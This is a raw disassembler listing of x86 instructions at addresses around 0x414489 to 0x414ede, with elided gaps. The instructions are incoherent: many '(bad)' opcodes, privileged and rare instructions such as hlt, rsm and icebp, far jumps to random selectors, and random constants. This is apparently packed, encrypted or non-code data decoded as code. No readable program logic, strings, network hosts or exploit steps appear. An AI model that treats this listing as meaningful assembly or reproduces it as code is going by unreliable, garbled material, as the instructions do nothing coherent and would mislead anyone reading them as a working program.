  414489:	ror    DWORD PTR es:[edi],cl
  41448c:	mov    cl,0xf5
  41448e:	adc    DWORD PTR [ebx+0xc2],edx
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x1b]
  414501:	mov    dh,0xab
  414503:	inc    esp
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0x2b000001,al
  41450d:	lods   al,BYTE PTR ds:[esi]
  41450e:	fbstp  TBYTE PTR ds:0x82caec1a
  414514:	rcr    edi,0x89
  414517:	cld    
  414518:	leave  
  414519:	retf   0x57ae
  41451c:	mov    dh,0x86
  41451e:	fcom   QWORD PTR [eax+0x48]
  414521:	cmp    edx,eax
  414523:	pop    ecx
  414524:	pop    edx
  414525:	loopne 0x41453b
  414527:	aaa    
  414528:	xchg   ebx,eax
  414529:	mov    dl,0xf4
  41452b:	mov    bl,0xae
  41452d:	into   
  41452e:	xor    dh,dh
  414530:	jbe    0x414596
  414532:	xchg   edx,eax
  414533:	inc    ecx
  414534:	test   al,0x3d
  414536:	ret    0xb331
  414539:	clc    
  41453a:	out    dx,eax
  41453b:	ss jno 0x4144ce
  41453e:	test   eax,0x9f59708e
  414543:	sub    ecx,DWORD PTR ds:0xebad1a28
  414549:	xlat   BYTE PTR ds:[ebx]
  41454a:	ss push ds
  41454c:	aaa    
  41454d:	jns    0x414561
  41454f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414550:	dec    ebp
  414551:	dec    esi
  414552:	sub    DWORD PTR [ebx-0x184a94e1],eax
  414558:	add    eax,0xb2e414d2
  41455d:	push   bp
  41455f:	mov    cs:0xe22db64c,al
  414565:	(bad)  
  414566:	(bad)  
  414567:	stos   DWORD PTR es:[edi],eax
  414568:	and    BYTE PTR [edx],al
  41456a:	mov    eax,ds:0x79a5e0f2
  41456f:	out    dx,al
  414570:	pop    esp
  414571:	pop    ecx
  414572:	push   0x457e28bf
  414577:	aad    0xd
  414579:	scas   eax,DWORD PTR es:[edi]
  41457a:	jns    0x41450d
  41457c:	jb     0x414545
  41457e:	js     0x41456c
  414580:	cwde   
  414581:	int3   
  414582:	push   es
  414583:	inc    edx
  414584:	sub    DWORD PTR [ebx],esp
  414586:	std    
  414587:	cmp    ch,bl
  414589:	repz dec esi
  41458b:	(bad)  
  41458c:	rcl    esp,1
  41458e:	push   esi
  41458f:	lods   eax,DWORD PTR ds:[esi]
  414590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414591:	push   0x3b
  414593:	add    BYTE PTR [ebp+0x38],dl
  414596:	cmp    cl,BYTE PTR [edi+ecx*2]
  414599:	xchg   ecx,eax
  41459a:	mov    eax,0xe0617fe3
  41459f:	mov    dl,BYTE PTR [edx-0x54]
  4145a2:	jecxz  0x41460d
  4145a4:	imul   edi,ebp,0x89b04115
  4145aa:	shr    edi,0x66
  4145ad:	das    
  4145ae:	or     ecx,esi
  4145b0:	hlt    
  4145b1:	adc    DWORD PTR [ebp+eiz*1-0x6489b195],0xbe192359
  4145bc:	jecxz  0x4145cd
  4145be:	adc    BYTE PTR [ebp-0x25],dh
  4145c1:	fsubr  DWORD PTR [eax-0x52]
  4145c4:	cmp    BYTE PTR [esi+0x31],ch
  4145c7:	jno    0x414556
  4145c9:	sqrtps xmm1,xmm7
  4145cc:	inc    BYTE PTR [ecx-0x6237736a]
  4145d2:	aam    0xa6
  4145d4:	and    ecx,DWORD PTR [eax-0x78ebeffa]
  4145da:	push   ds
  4145db:	dec    ecx
  4145dc:	outs   dx,DWORD PTR ds:[esi]
  4145dd:	retf   0x20ed
  4145e0:	cdq    
  4145e1:	xchg   ebp,eax
  4145e2:	into   
  4145e3:	xchg   ch,dl
  4145e5:	xchg   ecx,eax
  4145e6:	test   eax,0xd8a04743
  4145eb:	pop    edi
  4145ec:	dec    edi
  4145ed:	sbb    ecx,DWORD PTR [edi+eiz*1-0xe]
  4145f1:	xchg   edx,eax
  4145f2:	or     esi,DWORD PTR [edx+ebp*8-0x14]
  4145f6:	sub    esi,ebp
  4145f8:	pop    ebx
  4145f9:	bnd jl 0x414619
  4145fc:	xchg   esi,eax
  4145fd:	dec    dh
  4145ff:	and    al,BYTE PTR [edx+esi*1]
  414602:	xchg   edx,eax
  414603:	neg    al
  414605:	not    BYTE PTR [eax]
  414607:	push   ebp
  414608:	fdivrp st(1),st
  41460a:	test   eax,0xc4595109
  41460f:	fcomp  QWORD PTR [ebx+0x0]
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x97
  414681:	imul   eax,DWORD PTR [eax],0x59
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x6f000001
  41468d:	shl    ah,1
  41468f:	jmp    0x3c3d:0xa26bb1d6
  414696:	push   ebp
  414697:	fdiv   QWORD PTR [edx+0x43]
  41469a:	adc    esi,DWORD PTR [ebx]
  41469c:	idiv   DWORD PTR [eax+0x55ef09c0]
  4146a2:	(bad)  [ecx+0x6d]
  4146a5:	pop    ebp
  4146a6:	loop   0x414698
  4146a8:	leave  
  4146a9:	mov    al,0x5c
  4146ab:	jo     0x4146dc
  4146ad:	inc    ebx
  4146ae:	xchg   edi,eax
  4146af:	mov    ecx,0xfdce87f8
  4146b4:	and    dh,BYTE PTR [edx-0x59224c45]
  4146ba:	shl    edi,0x1c
  4146bd:	(bad)  
  4146be:	in     al,dx
  4146bf:	out    0xa4,al
  4146c1:	xchg   ecx,eax
  4146c2:	mov    edx,0x8f43e984
  4146c7:	icebp  
  4146c8:	or     ah,ah
  4146ca:	pop    es
  4146cb:	push   esp
  4146cc:	adc    DWORD PTR [edi+0x3],0xffffff95
  4146d0:	mov    ebp,0xc2bb2f8a
  4146d5:	cmp    eax,0xd26b94ff
  4146da:	jns    0x4146b2
  4146dc:	fcmovu st,st(6)
  4146de:	lods   eax,DWORD PTR ds:[esi]
  4146df:	push   es
  4146e0:	sub    eax,0x64a4331f
  4146e5:	dec    esp
  4146e6:	dec    edx
  4146e7:	sti    
  4146e8:	imul   esi,DWORD PTR [edx-0x43],0x9b252000
  4146ef:	xchg   BYTE PTR [eax+0x7b],ch
  4146f2:	out    0x74,eax
  4146f4:	lock sub al,0x5d
  4146f7:	jb     0x414686
  4146f9:	imul   eax,DWORD PTR [ebp+0x48],0xfffffff6
  4146fd:	in     al,dx
  4146fe:	mov    ds:0xaa4263c5,al
  414703:	mov    ecx,0xa4183272
  414708:	test   BYTE PTR [ebx],dh
  41470a:	jg     0x4146fd
  41470c:	inc    esp
  41470d:	inc    esi
  41470e:	es cdq 
  414710:	xor    eax,0x3b6a06d0
  414715:	jno    0x4146cf
  414717:	daa    
  414718:	add    DWORD PTR [ecx-0x52599c3d],ebx
  41471e:	mov    ds,eax
  414720:	mov    al,0x53
  414722:	mov    al,ds:0xaf33606f
  414727:	ja     0x41473e
  414729:	mov    dh,0x71
  41472b:	pop    ebp
  41472c:	dec    ebx
  41472d:	xchg   BYTE PTR [ebp-0x13],cl
  414730:	mov    ebp,DWORD PTR ds:0xaa3bb516
  414736:	rol    DWORD PTR [ecx],0x84
  414739:	pusha  
  41473a:	or     edi,DWORD PTR [ecx+0x30c784cb]
  414740:	push   ds
  414741:	aas    
  414742:	xchg   esp,eax
  414743:	mov    edi,0xecb2200
  414748:	arpl   WORD PTR [esi+0x32],si
  41474b:	cmp    BYTE PTR gs:[esi+0x71f313ea],ah
  414752:	aaa    
  414753:	jecxz  0x4147bb
  414755:	lea    esi,[ebp+0x3]
  414758:	adc    al,0x96
  41475a:	xor    bl,0x92
  41475d:	or     eax,0xfa4ee8af
  414762:	dec    eax
  414763:	sbb    esi,DWORD PTR [ebx]
  414765:	mov    esi,0x25f05c43
  41476a:	sub    BYTE PTR [esi],dl
  41476c:	and    dl,BYTE PTR [edi-0x1d]
  41476f:	(bad)  
  414770:	sub    eax,0x6c963e5c
  414775:	fcom   DWORD PTR [ecx-0x5dcfb11b]
  41477b:	sub    eax,0xa560cdcb
  414780:	icebp  
  414781:	mov    ecx,0x7b613dd7
  414786:	add    bh,dl
  414788:	sub    eax,esi
  41478a:	cmp    DWORD PTR [edi+0x301eebfe],ebx
  414790:	and    al,BYTE PTR [eax]
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x32a8b087
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x78000001
  41480d:	cmp    dh,BYTE PTR [esi-0x2c]
  414810:	(bad)  
  414811:	mov    dh,0x7c
  414813:	push   ds
  414814:	sub    ebp,DWORD PTR [edx]
  414816:	aam    0xad
  414818:	push   0xffffff8e
  41481a:	mov    bh,0xf4
  41481c:	cmp    DWORD PTR [esi+ecx*4],esp
  41481f:	(bad)  
  414820:	loope  0x414863
  414822:	lea    edi,[ecx]
  414824:	push   ds
  414825:	shl    DWORD PTR [edi+0x34952d35],0xef
  41482c:	push   ss
  41482d:	stc    
  41482e:	aad    0x1b
  414830:	mov    edx,0xbcbdd9de
  414835:	rol    DWORD PTR [eax+0x4f0217eb],cl
  41483b:	inc    eax
  41483c:	jne    0x414883
  41483e:	fisttp QWORD PTR [ebx+0x1c6091a9]
  414844:	adc    al,0x5
  414846:	adc    eax,0x69ee2f81
  41484b:	jmp    0x414826
  41484d:	pop    ecx
  41484e:	pop    ss
  41484f:	sbb    eax,0xc05fc0d9
  414854:	pushw  cs
  414856:	mov    edi,ebx
  414858:	imul   edi,DWORD PTR [ecx-0x3c962dcf],0x77b090fa
  414862:	or     al,0x38
  414864:	jg     0x4147fc
  414866:	pop    es
  414867:	repnz (bad) 
  414869:	mov    ecx,0x3737dadd
  41486e:	arpl   WORD PTR [eax-0x59],dx
  414871:	jbe    0x414879
  414873:	mov    ds:0xed520cb9,eax
  414878:	jbe    0x414874
  41487a:	sahf   
  41487b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41487c:	scas   al,BYTE PTR es:[edi]
  41487d:	jle    0x41486d
  41487f:	fidivr DWORD PTR [edi]
  414881:	sbb    al,0x79
  414883:	push   ecx
  414884:	sub    esi,ecx
  414886:	mov    al,ds:0x60b7c0e5
  41488b:	jecxz  0x41484d
  41488d:	pop    ds
  41488e:	shr    BYTE PTR [esi+0x3a],1
  414891:	or     eax,0xb09d19bf
  414896:	retf   0x6083
  414899:	ins    DWORD PTR es:[edi],dx
  41489a:	push   0x7a
  41489c:	and    eax,eax
  41489e:	cmp    al,0xf4
  4148a0:	arpl   WORD PTR [edi],bx
  4148a2:	xor    edi,DWORD PTR [ebx+0x648b4e6a]
  4148a8:	pusha  
  4148a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148aa:	mov    edi,0x72e1beef
  4148af:	rol    DWORD PTR [ecx],cl
  4148b1:	leave  
  4148b2:	mov    ds:0xa00f0abc,al
  4148b7:	cmc    
  4148b8:	xchg   DWORD PTR [esi-0x41],ebp
  4148bb:	ss cmp al,0xa5
  4148be:	daa    
  4148bf:	add    al,0x1f
  4148c1:	and    DWORD PTR [edi+0x7e41e116],edx
  4148c7:	outs   dx,DWORD PTR ds:[esi]
  4148c8:	push   ss
  4148c9:	lock mov esi,0x4c9951b1
  4148cf:	add    eax,0xfa49b35c
  4148d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148d5:	fsubr  QWORD PTR [ebp-0x3252d949]
  4148db:	xor    DWORD PTR [ebx+0x43378655],0xa8036b47
  4148e5:	out    dx,al
  4148e6:	stc    
  4148e7:	dec    esi
  4148e8:	lods   al,BYTE PTR ds:[esi]
  4148e9:	xor    eax,0xb0d6de26
  4148ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ef:	aad    0xe2
  4148f1:	rsm    
  4148f3:	mov    ds:0xd8206ade,eax
  4148f8:	fcmovb st,st(7)
  4148fa:	push   ss
  4148fb:	jno    0x414928
  4148fd:	arpl   bx,di
  4148ff:	pop    esp
  414900:	jnp    0x4148b8
  414902:	jae    0x41492e
  414904:	dec    eax
  414905:	(bad)  
  414906:	xchg   ebx,eax
  414907:	(bad)  
  414908:	shl    DWORD PTR [ecx-0x55],cl
  41490b:	outs   dx,BYTE PTR ds:[esi]
  41490c:	je     0x4148b3
  41490e:	data16 int3 
  414910:	push   ebx
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	ror    DWORD PTR [edx-0x65],0x21
  414984:	(bad)  
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0xa5000001,al
  41498d:	jmp    0x6751:0x3c5fa5b4
  414994:	scas   eax,DWORD PTR es:[edi]
  414995:	je     0x41496c
  414997:	cmp    ch,ah
  414999:	mov    esp,0x81f47db7
  41499e:	fdivr  DWORD PTR [eax+edx*1-0x54]
  4149a2:	das    
  4149a3:	inc    ebx
  4149a4:	test   eax,0x950f5b14
  4149a9:	imul   ecx,DWORD PTR [ebx],0xe6e76194
  4149af:	ins    BYTE PTR es:[edi],dx
  4149b0:	fs adc edx,edi
  4149b3:	stos   BYTE PTR es:[edi],al
  4149b4:	inc    ecx
  4149b5:	inc    esi
  4149b6:	mov    cl,0xd1
  4149b8:	(bad)  
  4149ba:	sti    
  4149bb:	mov    esi,0x486f34d3
  4149c0:	cmc    
  4149c1:	cli    
  4149c2:	mov    ebx,DWORD PTR [ebx+0x4]
  4149c5:	pop    esp
  4149c6:	pushf  
  4149c7:	(bad)  
  4149c8:	ins    DWORD PTR es:[edi],dx
  4149c9:	pop    ds
  4149ca:	sbb    BYTE PTR [esi+0x7c0fa217],0xcb
  4149d1:	and    esi,ecx
  4149d3:	lods   eax,DWORD PTR ds:[esi]
  4149d4:	scas   eax,DWORD PTR es:[edi]
  4149d5:	imul   ebx,DWORD PTR fs:0xdafda730,0xffffffd6
  4149dd:	adc    eax,0x217a310c
  4149e2:	xlat   BYTE PTR ds:[ebx]
  4149e3:	sbb    al,0xcb
  4149e5:	push   edi
  4149e6:	enter  0xd385,0x5d
  4149ea:	ret    0x64f7
  4149ed:	cli    
  4149ee:	bound  ebx,QWORD PTR [ecx]
  4149f0:	xchg   esp,eax
  4149f1:	cwde   
  4149f2:	aaa    
  4149f3:	pop    ebx
  4149f4:	and    esi,DWORD PTR [ebx+0x34]
  4149f7:	(bad)  
  4149f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f9:	je     0x414985
  4149fb:	(bad)  
  4149fc:	push   0x229bf8cc
  414a01:	dec    edx
  414a02:	push   es
  414a03:	sub    bl,0x7d
  414a06:	and    al,0x56
  414a08:	sub    eax,0x84327b9c
  414a0d:	das    
  414a0e:	jmp    0xa7ed:0x6ab64fd1
  414a15:	test   ebp,esi
  414a17:	pop    ss
  414a18:	bswap  eax
  414a1a:	xor    BYTE PTR [esi-0x3a1d8bc6],bl
  414a20:	jmp    0x3b9a:0x4d319d1
  414a27:	push   edi
  414a28:	mov    ds:0x9d80c563,eax
  414a2d:	gs clc 
  414a2f:	xchg   edi,eax
  414a30:	mov    ch,bh
  414a32:	push   esp
  414a33:	fucomip st,st(5)
  414a35:	add    eax,0x2e06a8a1
  414a3a:	xor    al,0xf9
  414a3c:	dec    ebx
  414a3d:	inc    eax
  414a3e:	xor    BYTE PTR [edx-0x5c81c50e],0x24
  414a45:	and    eax,0xff5305f3
  414a4a:	dec    esi
  414a4b:	rcr    DWORD PTR [ecx],1
  414a4d:	sub    al,0xaa
  414a4f:	pop    esi
  414a50:	sbb    eax,0xc54d5e8c
  414a55:	lds    edx,FWORD PTR [edx+0x4fb49705]
  414a5b:	and    ah,BYTE PTR cs:[eax+0x1caaa1f9]
  414a62:	xchg   ebp,eax
  414a63:	cmp    al,0x76
  414a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a66:	add    DWORD PTR [edi],edi
  414a68:	xchg   ecx,eax
  414a69:	(bad)  
  414a6a:	sbb    DWORD PTR [edi-0x5a],ebx
  414a6d:	sahf   
  414a6e:	imul   esp,DWORD PTR [eax+0x2e6b99f2],0x41
  414a75:	inc    esi
  414a76:	cwde   
  414a77:	es dec ecx
  414a79:	ret    
  414a7a:	cmp    al,0xe6
  414a7c:	pop    ebx
  414a7d:	xabort 0xd3
  414a80:	(bad)  
  414a81:	jg     0x414a27
  414a83:	mov    ebp,0x23e800df
  414a88:	aas    
  414a89:	dec    edi
  414a8a:	(bad)  
  414a8b:	out    dx,al
  414a8c:	push   esp
  414a8d:	outs   dx,BYTE PTR ds:[esi]
  414a8e:	fistp  DWORD PTR [ebp+0x2e]
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [eax],dx
  414b01:	arpl   WORD PTR [eax-0x4a],bp
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x84000001
  414b0d:	das    
  414b0e:	cmp    bl,BYTE PTR [ebx+ebx*4]
  414b11:	sub    BYTE PTR [ecx-0xcc33ad9],ch
  414b17:	add    edx,DWORD PTR [esi+ebp*1-0x4f]
  414b1b:	fnclex 
  414b1d:	adc    ecx,DWORD PTR [ecx]
  414b1f:	jp     0x414ada
  414b21:	push   0x59d6e3c4
  414b26:	dec    ecx
  414b27:	mov    esp,0x968d1c80
  414b2c:	mov    esp,0x35c3766f
  414b31:	popa   
  414b32:	in     eax,dx
  414b33:	fs sub al,0x92
  414b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b37:	jbe    0x414adc
  414b39:	pop    edx
  414b3a:	mov    dl,0x68
  414b3c:	test   BYTE PTR [ecx-0x1313e4eb],ch
  414b42:	mov    ecx,0xc9d84910
  414b47:	jl     0x414af4
  414b49:	xchg   ecx,eax
  414b4a:	hlt    
  414b4b:	pusha  
  414b4c:	xor    DWORD PTR [ebp+0x5c],esi
  414b4f:	(bad)  
  414b50:	mov    gs,si
  414b53:	hlt    
  414b54:	gs pop esp
  414b56:	add    esp,DWORD PTR [edx+eax*2]
  414b59:	test   al,0x2e
  414b5b:	in     al,0xa1
  414b5d:	fbld   TBYTE PTR [ecx+0xa]
  414b60:	pop    ds
  414b61:	lea    edi,[ecx+ebp*8-0x6e09fa8d]
  414b68:	add    BYTE PTR [esi-0x3aef7e4e],dl
  414b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6f:	cwde   
  414b70:	mov    bh,0x75
  414b72:	cs pop ss
  414b74:	(bad)  
  414b75:	sub    ebp,DWORD PTR [edi-0x1a]
  414b78:	jb     0x414bbc
  414b7a:	aad    0xff
  414b7c:	push   eax
  414b7d:	xor    BYTE PTR [esp+eax*4],ah
  414b80:	jns    0x414b21
  414b82:	mov    esp,DWORD PTR [ecx+0x38]
  414b85:	inc    ecx
  414b86:	and    BYTE PTR [esi],bh
  414b88:	mov    ch,0x1b
  414b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b8b:	fmul   DWORD PTR [esi-0xa]
  414b8e:	sbb    BYTE PTR [esp+ebx*8],0xdf
  414b92:	inc    ebp
  414b93:	(bad)  
  414b94:	out    0xa,al
  414b96:	mov    eax,0x39d4e9a3
  414b9b:	mov    esi,0x69db7d0a
  414ba0:	push   cs
  414ba1:	(bad)  
  414ba2:	test   al,0x1f
  414ba4:	loop   0x414be3
  414ba6:	ins    BYTE PTR es:[edi],dx
  414ba7:	cdq    
  414ba8:	vcvtpd2dq xmm4,YMMWORD PTR [esi]
  414bac:	mov    ebx,0xa23d6b65
  414bb1:	dec    edi
  414bb2:	out    dx,al
  414bb3:	mov    bh,bl
  414bb5:	add    eax,0xaa904df2
  414bba:	daa    
  414bbb:	add    DWORD PTR [ebx],edi
  414bbd:	sar    DWORD PTR [eax+0x38],1
  414bc0:	pop    es
  414bc1:	and    al,0x96
  414bc3:	cmp    esp,DWORD PTR [eax-0x77]
  414bc6:	push   0x8a67e2d4
  414bcb:	xor    ah,BYTE PTR [ecx-0x33]
  414bce:	imul   edx,esi,0x6eb7fbd8
  414bd4:	call   0x1cf9aae1
  414bd9:	xchg   edi,eax
  414bda:	add    DWORD PTR [edi-0x67bdcf6a],0xfffffffd
  414be1:	mov    ?,WORD PTR [eax-0x4b712b5f]
  414be7:	sub    esp,esi
  414be9:	cmp    al,0xb4
  414beb:	call   0x3b33:0x3a647c28
  414bf2:	xchg   ecx,eax
  414bf3:	pop    es
  414bf4:	ja     0x414c02
  414bf6:	sub    DWORD PTR [ebp-0x80],esp
  414bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bfa:	xor    eax,0xbd6c2e1
  414bff:	mov    cl,0x8e
  414c01:	int    0xf3
  414c03:	ret    0x8f08
  414c06:	sbb    BYTE PTR [esi-0x43],ah
  414c09:	mov    ebp,0x3f360b57
  414c0e:	pop    edx
  414c0f:	mov    ebx,0x82
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebx,DWORD PTR cs:[ebx+0x91f42e9]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0x44000001,al
  414c8d:	jae    0x414cdf
  414c8f:	dec    edi
  414c90:	sbb    bl,BYTE PTR [edi+0x15b43245]
  414c96:	rcl    BYTE PTR [eax],1
  414c98:	popf   
  414c99:	ins    BYTE PTR es:[edi],dx
  414c9a:	inc    esi
  414c9b:	leave  
  414c9c:	adc    esi,DWORD PTR [ecx+0x21211b3a]
  414ca2:	popa   
  414ca3:	cld    
  414ca4:	inc    esi
  414ca5:	adc    BYTE PTR [ecx-0x13],ch
  414ca8:	cmp    DWORD PTR [ecx],ebx
  414caa:	push   ds
  414cab:	cmp    eax,0x40c25b90
  414cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb1:	or     al,0xae
  414cb3:	xor    ah,dl
  414cb5:	sub    ebp,DWORD PTR ds:0xbf9218be
  414cbb:	sub    DWORD PTR [edi+esi*1-0x561496ea],ebx
  414cc2:	jo     0x414d20
  414cc4:	jg     0x414c61
  414cc6:	jecxz  0x414cce
  414cc8:	mov    ds:0x6a920535,al
  414ccd:	imul   edi,ebp,0x13
  414cd0:	and    eax,0x99137e59
  414cd5:	pop    ds
  414cd6:	(bad)  
  414cd7:	ja     0x414c6e
  414cd9:	repz shl DWORD PTR [ebp-0x23],1
  414cdd:	cmp    al,0xe6
  414cdf:	push   ss
  414ce0:	mov    dl,BYTE PTR [esp+esi*2]
  414ce3:	popf   
  414ce4:	add    eax,0x9894a14a
  414ce9:	push   ds
  414cea:	push   esi
  414ceb:	call   0xefed:0xdcd31e8a
  414cf2:	cli    
  414cf3:	sub    BYTE PTR [eax],cl
  414cf5:	push   esp
  414cf6:	add    eax,0x6b201a17
  414cfb:	sti    
  414cfc:	push   es
  414cfd:	pop    ecx
  414cfe:	scas   eax,DWORD PTR es:[edi]
  414cff:	iret   
  414d00:	xor    BYTE PTR [edi+0x6bc9f163],dh
  414d06:	mov    ebp,0x3118d86b
  414d0b:	xchg   esp,eax
  414d0c:	jmp    0x414d54
  414d0e:	inc    edx
  414d0f:	aam    0x85
  414d11:	aam    0x3d
  414d13:	fcmovnu st,st(5)
  414d15:	pop    ss
  414d16:	mov    edi,DWORD PTR [ebx+0x7609fd2a]
  414d1c:	jo     0x414d71
  414d1e:	and    BYTE PTR [edi],bl
  414d20:	adc    edi,DWORD PTR [edi-0x24]
  414d23:	test   eax,0xec8e9153
  414d28:	int    0xb5
  414d2a:	shl    BYTE PTR [eax+0x7d],1
  414d2d:	and    BYTE PTR [esi+0x53],bl
  414d30:	call   0x7daa663e
  414d35:	imul   esi,DWORD PTR ds:0x91ec123b,0x4d
  414d3c:	out    dx,al
  414d3d:	repnz xchg esp,eax
  414d3f:	cmp    DWORD PTR [edx+0x1b],esp
  414d42:	(bad)  
  414d44:	jge    0x414d32
  414d46:	mov    ecx,0x63006238
  414d4b:	mov    dl,0x38
  414d4d:	pop    esi
  414d4e:	lods   al,BYTE PTR ds:[esi]
  414d4f:	add    dh,dl
  414d51:	aaa    
  414d52:	add    eax,0x3bc8ebc5
  414d57:	int3   
  414d58:	jnp    0x414d61
  414d5a:	or     eax,DWORD PTR es:[esi-0x63cd610a]
  414d61:	ja     0x414cfd
  414d63:	inc    esi
  414d64:	pop    edx
  414d65:	loopne 0x414d38
  414d67:	push   esi
  414d68:	mov    esi,0x3f4b51d8
  414d6d:	loope  0x414d7e
  414d6f:	adc    DWORD PTR [eax+eiz*1-0x4a],edx
  414d73:	and    bh,BYTE PTR [edi-0x55]
  414d76:	stos   DWORD PTR es:[edi],eax
  414d77:	retf   
  414d78:	adc    eax,edi
  414d7a:	retf   0x301d
  414d7d:	out    dx,eax
  414d7e:	dec    edi
  414d7f:	xchg   BYTE PTR [esi+0x4c8ac1be],cl
  414d85:	out    0xee,eax
  414d87:	(bad)  
  414d88:	push   eax
  414d89:	(bad)  [eax+0x26f1eb67]
  414d8f:	pop    ebp
  414d90:	test   DWORD PTR [eax],0x0
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x38d81615
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x4e000001,al
  414e0d:	inc    ebx
  414e0e:	push   esp
  414e0f:	fsubp  st(6),st
  414e11:	sub    ch,BYTE PTR [edx-0x77758ce2]
  414e17:	fs mov ebx,0x7ee2718b
  414e1d:	push   esi
  414e1e:	xchg   edx,eax
  414e1f:	push   es
  414e20:	jp     0x414e02
  414e22:	cmp    al,0xc9
  414e24:	mov    dh,0xaa
  414e26:	xlat   BYTE PTR ds:[ebx]
  414e27:	inc    edx
  414e28:	fidivr WORD PTR [edx]
  414e2a:	fmul   DWORD PTR [edx-0x7c]
  414e2d:	test   DWORD PTR [edx],ebx
  414e2f:	repz icebp 
  414e31:	popf   
  414e32:	dec    eax
  414e33:	test   eax,0x8218c77b
  414e38:	cwde   
  414e39:	inc    esp
  414e3a:	jmp    0x3e234ca0
  414e3f:	push   ds
  414e40:	inc    edx
  414e41:	add    ch,BYTE PTR ds:0x66e7afeb
  414e47:	shr    BYTE PTR [esi-0x54],1
  414e4a:	sbb    al,0xf2
  414e4c:	push   ss
  414e4d:	sub    al,0xfb
  414e4f:	aas    
  414e50:	lods   eax,DWORD PTR ds:[esi]
  414e51:	or     bh,BYTE PTR [eax+0x7]
  414e54:	push   ds
  414e55:	mov    esi,DWORD PTR [ebp+0x60]
  414e58:	adc    eax,0x205a03bd
  414e5d:	loopne 0x414ed4
  414e5f:	push   es
  414e60:	push   ebp
  414e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e62:	inc    DWORD PTR [ebp+edx*8-0x3d8ab546]
  414e69:	mov    eax,ds:0x8f1c4096
  414e6e:	shl    BYTE PTR [esi-0x26344658],cl
  414e74:	imul   edi,eax,0xffffff9f
  414e77:	push   esi
  414e78:	(bad)  
  414e79:	out    dx,eax
  414e7a:	jb     0x414e91
  414e7c:	call   0xcd1721fa
  414e81:	sub    eax,0x911dbb41
  414e86:	or     al,0x2d
  414e88:	pop    ss
  414e89:	mov    al,ds:0x31267781
  414e8e:	sub    eax,0x55cca42e
  414e93:	imul   esp,edi,0xffffffa8
  414e96:	cdq    
  414e97:	jg     0x414e30
  414e99:	arpl   WORD PTR [edi+0x1c],cx
  414e9c:	xor    al,0x9d
  414e9e:	dec    ebx
  414e9f:	push   ds
  414ea0:	lods   al,BYTE PTR ds:[esi]
  414ea1:	imul   eax,edx,0xe6e82e94
  414ea7:	(bad)  
  414ea8:	xchg   ecx,eax
  414ea9:	jmp    0xce51:0x8610b8d3
  414eb0:	mov    al,0xe0
  414eb2:	jg     0x414eec
  414eb4:	xchg   esi,eax
  414eb5:	pop    esp
  414eb6:	(bad)  
  414eb7:	shl    edi,0x2c
  414eba:	mov    ?,WORD PTR [ecx]
  414ebc:	or     al,BYTE PTR [ebx-0x45]
  414ebf:	js     0x414ef3
  414ec1:	rcl    BYTE PTR [edi-0x6dd556c6],1
  414ec7:	pop    esp
  414ec8:	cmp    esp,DWORD PTR [esi+ebp*8]
  414ecb:	mov    cl,dl
  414ecd:	fdivr  QWORD PTR [ebx-0x43734052]
  414ed3:	fs xor ebx,edx
  414ed6:	or     edx,esp
  414ed8:	dec    esi
  414ed9:	xchg   ebx,eax
  414eda:	lods   eax,DWORD PTR ds:[esi]
  414edb:	cmp    DWORD PTR [ebx],eax
  414edd:	stos   DWORD PTR es:[edi],eax
  414ede:	cmp    ebp,edx
